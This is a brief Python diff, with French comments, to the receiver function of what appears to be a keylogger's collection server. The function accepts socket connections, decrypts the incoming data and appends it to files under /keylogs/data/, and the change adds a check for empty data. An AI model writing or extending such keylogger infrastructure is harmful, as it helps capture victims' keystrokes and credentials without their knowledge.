@@ -75,8 +75,9 @@ def receiver(port):
         # recu data
         with open("/keylogs/data/" + ficname, "a") as f:
             data = client_socket.recv(1024)
-            f.write(dechiffrement(data))
-            print("connexion :" + ficname)
+            if data :
+                f.write(dechiffrement(data))
+                print("connexion :" + ficname)
     client_socket.close()
     server_socket.close()
 
